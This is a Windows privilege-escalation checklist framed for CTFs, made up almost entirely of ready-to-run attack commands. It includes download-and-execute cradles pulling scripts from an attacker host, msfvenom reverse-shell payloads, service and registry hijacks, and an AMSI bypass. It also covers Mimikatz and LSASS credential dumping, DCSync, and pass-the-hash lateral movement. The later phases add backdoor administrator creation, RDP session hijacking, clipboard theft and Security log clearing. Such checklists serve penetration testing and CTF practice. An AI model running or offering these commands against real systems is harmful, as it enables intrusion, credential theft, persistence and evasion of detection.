# Windows Privilege Escalation - Quick Checklist

> **Maat-Cyber-World**  | A practical checklist for privilege escalation in windows based CTFs |  **Updated:** 2026

---

## Document Structure & Quick Nav
- [Windows Privilege Escalation - Quick Checklist](#windows-privilege-escalation---quick-checklist)
  - [Document Structure \& Quick Nav](#document-structure--quick-nav)
  - [Phase 0 - Stabilize Shell](#phase-0---stabilize-shell)
  - [Phase 1 - Situational Awareness](#phase-1---situational-awareness)
  - [Phase 2 - Privileges \& Tokens](#phase-2---privileges--tokens)
  - [Phase 3 - Unquoted Service Paths](#phase-3---unquoted-service-paths)
  - [Phase 4 - Weak Service Permissions](#phase-4---weak-service-permissions)
  - [Phase 5 - Weak Registry Permissions](#phase-5---weak-registry-permissions)
  - [Phase 6 - AlwaysInstallElevated](#phase-6---alwaysinstallelevated)
  - [Phase 7 - Scheduled Tasks](#phase-7---scheduled-tasks)
  - [Phase 8 - Stored Credentials](#phase-8---stored-credentials)
  - [Phase 9 - Sensitive Files](#phase-9---sensitive-files)
  - [Phase 10 - Kernel Exploits](#phase-10---kernel-exploits)
  - [Phase 11 - Token Impersonation](#phase-11---token-impersonation)
  - [Phase 12 - UAC Bypass](#phase-12---uac-bypass)
  - [Phase 13 - Network Pivoting](#phase-13---network-pivoting)
  - [Phase 14 - Auto-Enum Tools](#phase-14---auto-enum-tools)
  - [Phase 15 - Mimikatz \& Credential Dumping](#phase-15---mimikatz--credential-dumping)
  - [Phase 16 - SMB Enumeration \& Lateral Movement](#phase-16---smb-enumeration--lateral-movement)
  - [Phase 17 - RDP Access \& Abuse](#phase-17---rdp-access--abuse)
  - [Quick Command Table](#quick-command-table)

<br/>
<br/>

---

## Phase 0 - Stabilize Shell

- [ ] Upgrade `cmd.exe` → `powershell -ep bypass`
- [ ] If Metasploit: `sessions -i 1` → `load kiwi`
- [ ] Download cradle ready: `powershell -c "iex (New-Object Net.WebClient).DownloadString('http://LHOST:8000/Invoke-PowerShellTcp.ps1')"`
- [ ] Confirm stable C2 (Sliver / Covenant / MSF)

<br/>
<br/>

---

## Phase 1 - Situational Awareness

- [ ] `whoami /all` → note groups (Admins, Backup Ops, Service Accts)
- [ ] `whoami /priv` → flag SeImpersonate / SeBackup / SeDebug
- [ ] `systeminfo` → OS build, arch (x64/x86), hotfix level
- [ ] `wmic qfe list full` → missing KBs for kernel exploits
- [ ] `ipconfig /all` + `route print` → internal ranges, DC IP
- [ ] `netstat -ano | findstr "LISTENING"` → localhost services
- [ ] `echo %USERDOMAIN%` + `nltest /dclist:DOMAIN` → domain context
- [ ] `tasklist /v | findstr "SYSTEM"` → high-integrity processes

<br/>
<br/>

---

## Phase 2 - Privileges & Tokens

- [ ] `whoami /priv` → cross-reference table below
- [ ] `whoami /groups | findstr "Mandatory"` → High = elevated, Medium = UAC filtered
- [ ] SeImpersonate / SeAssignPrimaryToken → go to Phase 11
- [ ] SeBackupPrivilege → dump SAM/SYSTEM (Phase 8.4)
- [ ] SeRestorePrivilege → overwrite service binaries (Phase 4)
- [ ] SeDebugPrivilege → inject LSASS / dump creds
- [ ] SeLoadDriverPrivilege → load vulnerable driver (CapCom.sys)

<br/>
<br/>

---

## Phase 3 - Unquoted Service Paths

- [ ] `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`
- [ ] Identify writable directory in path chain (`icacls "C:\Program Files\App"`)
- [ ] `accesschk.exe /accepteula -uwdq "C:\Path\To\Dir"`
- [ ] Generate payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=9001 -f exe -o Program.exe`
- [ ] Drop binary → `sc stop "Svc" && sc start "Svc"`

<br/>
<br/>

---

## Phase 4 - Weak Service Permissions

- [ ] `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`
- [ ] `accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *`
- [ ] Check binary perms: `icacls "C:\Path\service.exe"`
- [ ] If config writable: `sc config "Svc" binPath= "C:\evil.exe" obj= "LocalSystem"`
- [ ] If binary writable: replace exe → restart service

<br/>
<br/>

---

## Phase 5 - Weak Registry Permissions

- [ ] `accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services`
- [ ] If writable: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\Svc" /v ImagePath /t REG_EXPAND_SZ /d "C:\evil.exe" /f`
- [ ] Restart service → catch shell

<br/>
<br/>

---

## Phase 6 - AlwaysInstallElevated

- [ ] `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- [ ] `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- [ ] Both = `0x1` → `msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=9001 -f msi -o evil.msi`
- [ ] `msiexec /quiet /qn /i C:\evil.msi`

<br/>
<br/>

---

## Phase 7 - Scheduled Tasks

- [ ] `schtasks /query /fo LIST /v` → note "Task To Run" paths
- [ ] `icacls "C:\Path\task.exe"` / `accesschk.exe -quvw "C:\Path\task.exe"`
- [ ] If writable: replace binary → `schtasks /run /tn "TaskName"`

<br/>
<br/>

---

## Phase 8 - Stored Credentials

- [ ] `dir /s /b C:\Unattend.xml C:\sysprep.inf C:\Windows\Panther\Unattend.xml 2>nul`
- [ ] `cmdkey /list` → `runas /savecred /user:Administrator cmd.exe`
- [ ] `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`
- [ ] `reg save HKLM\SAM C:\temp\SAM && reg save HKLM\SYSTEM C:\temp\SYSTEM`
- [ ] `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
- [ ] `type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- [ ] `netsh wlan show profile name="SSID" key=clear`
- [ ] Check browser stores (Chrome `Login Data`, Firefox `logins.json`)

<br/>
<br/>

---

## Phase 9 - Sensitive Files

- [ ] `dir /s /b C:\*.config C:\*.conf C:\*.ini 2>nul | findstr /i "pass cred secret"`
- [ ] `dir /s /b C:\Users\*\.ssh\id_rsa C:\Users\*\.ssh\id_ed25519 2>nul`
- [ ] `type C:\inetpub\wwwroot\web.config`
- [ ] WSL: `wsl -d Ubuntu -e cat /etc/shadow`

<br/>
<br/>

---

## Phase 10 - Kernel Exploits

- [ ] `systeminfo > sysinfo.txt` → transfer to attacker
- [ ] `python3 wes.py sysinfo.txt` (Windows Exploit Suggester)
- [ ] Or run `Watson.exe` on target
- [ ] Cross-ref missing KBs → CVE table (PrintNightmare, CLFS, win32k)
- [ ] ⚠️ Last resort - can BSOD

<br/>
<br/>

---

## Phase 11 - Token Impersonation

- [ ] Confirm: `whoami /priv | findstr "SeImpersonatePrivilege"`
- [ ] Win10 < 1809 → **JuicyPotato**
- [ ] Win10/Server 2016-2019 → **PrintSpoofer**: `PrintSpoofer.exe -i -c cmd`
- [ ] Win10/11/Server 2012-2022 → **GodPotato**: `GodPotato.exe -cmd "C:\evil.exe"`
- [ ] Meterpreter: `use incognito` → `impersonate_token "NT AUTHORITY\\SYSTEM"`

<br/>
<br/>

---

## Phase 12 - UAC Bypass

- [ ] `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA`
- [ ] `reg query "HKLM\...\Policies\System" /v ConsentPromptBehaviorAdmin`
- [ ] fodhelper: `reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\evil.exe" /f` + `reg add ... /v DelegateExecute /t REG_SZ /f` → run `fodhelper.exe`
- [ ] eventvwr / sdclt / computerdefaults as alternates
- [ ] MSF: `use exploit/windows/local/bypassuac_fodhelper`

<br/>
<br/>

---

## Phase 13 - Network Pivoting

- [ ] `netstat -ano | findstr "127.0.0.1"` → hidden local services
- [ ] `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1`
- [ ] Chisel: `chisel.exe client LHOST:8000 R:3389:127.0.0.1:3389`
- [ ] SOCKS: `ssh -D 1080 user@target` or MSF `auxiliary/server/socks_proxy`

<br/>
<br/>

---

## Phase 14 - Auto-Enum Tools

- [ ] `winPEASx64.exe` → full enum
- [ ] `Seatbelt.exe -group=all`
- [ ] `powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://LHOST:8000/PowerUp.ps1'); Invoke-AllChecks"`
- [ ] `SharpUp.exe` / `PrivescCheck` / `jaws-enum.ps1`
- [ ] Transfer: `certutil -urlcache -split -f http://LHOST:8000/winPEASx64.exe C:\temp\winPEASx64.exe`

<br/>
<br/>

---

## Phase 15 - Mimikatz & Credential Dumping

**When to use:** After obtaining admin/SYSTEM shell, or when SeDebugPrivilege is present. Use for plaintext creds, NTLM hashes, Kerberos tickets, and DPAPI secrets.

- [ ] Confirm admin context: `whoami /groups | findstr "High Mandatory"`
- [ ] Disable AMSI (if needed): `powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"`
- [ ] Run Mimikatz: `mimikatz.exe` → `privilege::debug` → `sekurlsa::logonpasswords`
- [ ] Dump SAM hashes: `lsadump::sam`
- [ ] Dump LSA secrets: `lsadump::secrets`
- [ ] Export Kerberos tickets: `sekurlsa::tickets /export`
- [ ] DCSync (domain admin): `lsadump::dcsync /user:DOMAIN\krbtgt`
- [ ] DPAPI master keys: `sekurlsa::dpapi`
- [ ] Wdigest plaintext (older OS): `sekurlsa::wdigest`
- [ ] One-liner (no interactive): `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`
- [ ] Meterpreter alternative: `load kiwi` → `creds_all` / `lsa_dump_sam`
- [ ] Procdump fallback (AV evasion): `procdump.exe -accepteula -ma lsass.exe lsass.dmp` → `sekurlsa::minidump lsass.dmp` → `sekurlsa::logonpasswords`
- [ ] CrackMapExec remote: `crackmapexec smb TARGET -u user -p pass --sam` / `--lsa` / `--ntds`
- [ ] Clean up: delete mimikatz binary, clear event logs if needed (`wevtutil cl Security`)

<br/>
<br/>

---

## Phase 16 - SMB Enumeration & Lateral Movement

**When to use:** After grabbing hashes/creds (Phase 8/15), or when port 445 is open on adjacent hosts. Key for pass-the-hash, share enumeration, and domain pivoting.

- [ ] Enumerate shares: `net view \\TARGET` / `net share`
- [ ] Check share access: `dir \\TARGET\C$` / `dir \\TARGET\ADMIN$`
- [ ] CrackMapExec full enum: `crackmapexec smb TARGET -u user -p pass --shares --users --groups --sessions`
- [ ] Null session check: `crackmapexec smb TARGET -u '' -p ''` / `rpcclient -U '' -N TARGET`
- [ ] SMBClient connect: `smbclient //TARGET/share -U user%pass`
- [ ] Pass-the-Hash: `crackmapexec smb TARGET -u user -H NTLM_HASH --sam`
- [ ] PsExec lateral: `impacket-psexec DOMAIN/user:pass@TARGET` / `impacket-psexec -hashes :NTLM DOMAIN/user@TARGET`
- [ ] WMIExec: `impacket-wmiexec DOMAIN/user:pass@TARGET`
- [ ] SMBExec: `impacket-smbexec DOMAIN/user:pass@TARGET`
- [ ] ATExec (scheduled task): `impacket-atexec DOMAIN/user:pass@TARGET "whoami"`
- [ ] Enumerate domain users: `net user /domain` / `net group "Domain Admins" /domain`
- [ ] BloodHound collection: `SharpHound.exe -c All` → upload to BloodHound GUI
- [ ] Check SMB signing: `crackmapexec smb TARGET --gen-relay-list` → relay if signing disabled
- [ ] NTLM relay: `ntlmrelayx.py -t smb://TARGET -smb2support`
- [ ] GPP passwords (SYSVOL): `dir \\DOMAIN\SYSVOL\DOMAIN\Policies\ /s /b | findstr /i "Groups.xml"`
- [ ] `type \\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml` → decrypt cpassword with `gpp-decrypt`

<br/>
<br/>

---

## Phase 17 - RDP Access & Abuse

**When to use:** When port 3389 is open, creds are available, or you need GUI access for further enumeration. Also check for RDP-based privesc and persistence.

- [ ] Confirm RDP open: `netstat -ano | findstr "3389"` / `nmap -p 3389 TARGET`
- [ ] Check if RDP enabled: `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections` (0 = enabled)
- [ ] Enable RDP (if admin): `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
- [ ] Allow through firewall: `netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`
- [ ] Connect: `xfreerdp /u:user /p:pass /v:TARGET /cert-ignore` or `rdesktop TARGET -u user -p pass`
- [ ] Pass-the-Hash RDP: `xfreerdp /u:user /pth:NTLM_HASH /v:TARGET /cert-ignore` (requires Restricted Admin disabled)
- [ ] Check Restricted Admin: `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin` (1 = disabled, PtH works)
- [ ] Enable Restricted Admin bypass: `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f`
- [ ] Add user to RDP group: `net localgroup "Remote Desktop Users" eviluser /add`
- [ ] Create backdoor user: `net user eviluser P@ss123 /add && net localgroup Administrators eviluser /add && net localgroup "Remote Desktop Users" eviluser /add`
- [ ] Check logged-in sessions: `query user` / `qwinsta`
- [ ] Hijack disconnected session (SYSTEM): `sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0" && net start sesshijack`
- [ ] RDP clipboard theft: connect → `powershell -c "Get-Clipboard"` (monitor victim clipboard)
- [ ] SharpRDP (lateral without GUI): `SharpRDP.exe computername=TARGET command="C:\evil.exe" username=DOMAIN\user password=pass`
- [ ] Tunnel RDP over SSH: `ssh -L 3389:127.0.0.1:3389 user@pivot` → connect to `localhost:3389`
- [ ] Tunnel RDP over Chisel: `chisel.exe client LHOST:8000 R:3389:TARGET:3389`

<br/>
<br/>

---

## Quick Command Table

| # | Check | Command |
|---|-------|---------|
| 1 | Identity | `whoami /all` |
| 2 | Privileges | `whoami /priv` |
| 3 | System info | `systeminfo` |
| 4 | Patches | `wmic qfe list full` |
| 5 | Unquoted paths | `wmic service get name,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """` |
| 6 | Service perms | `accesschk.exe /accepteula -uwcqv "Authenticated Users" *` |
| 7 | AlwaysInstallElevated | `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |
| 8 | Scheduled tasks | `schtasks /query /fo LIST /v` |
| 9 | Saved creds | `cmdkey /list` |
| 10 | Unattend files | `dir /s /b C:\Unattend.xml C:\sysprep.inf 2>nul` |
| 11 | SAM dump | `reg save HKLM\SAM C:\temp\SAM && reg save HKLM\SYSTEM C:\temp\SYSTEM` |
| 12 | PS history | `type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| 13 | Listening ports | `netstat -ano \| findstr "LISTENING"` |
| 14 | UAC status | `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA` |
| 15 | Impersonation check | `whoami /priv \| findstr "SeImpersonatePrivilege"` |
| 16 | WiFi creds | `netsh wlan show profile name="SSID" key=clear` |
| 17 | Winlogon pass | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword` |
| 18 | Domain info | `nltest /dclist:DOMAIN` |
| 19 | Mimikatz dump | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` |
| 20 | LSASS procdump | `procdump.exe -accepteula -ma lsass.exe lsass.dmp` |
| 21 | SMB shares | `crackmapexec smb TARGET -u user -p pass --shares` |
| 22 | Pass-the-Hash | `crackmapexec smb TARGET -u user -H NTLM_HASH --sam` |
| 23 | PsExec lateral | `impacket-psexec DOMAIN/user:pass@TARGET` |
| 24 | RDP status | `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections` |
| 25 | RDP connect | `xfreerdp /u:user /p:pass /v:TARGET /cert-ignore` |
| 26 | RDP PtH | `xfreerdp /u:user /pth:NTLM_HASH /v:TARGET /cert-ignore` |
| 27 | GPP decrypt | `gpp-decrypt <cpassword>` |
| 28 | DCSync | `mimikatz.exe "lsadump::dcsync /user:DOMAIN\krbtgt" "exit"` |

<br/>

---

*Priority for CTFs: Creds → Unquoted → Service/Reg Perms → AIE → Tasks → Tokens → Mimikatz → SMB/RDP Lateral → Kernel*
*Maat | [Maat-Cyber-World](https://github.com/Maat-Cyber/Maat-Cyber-World)*
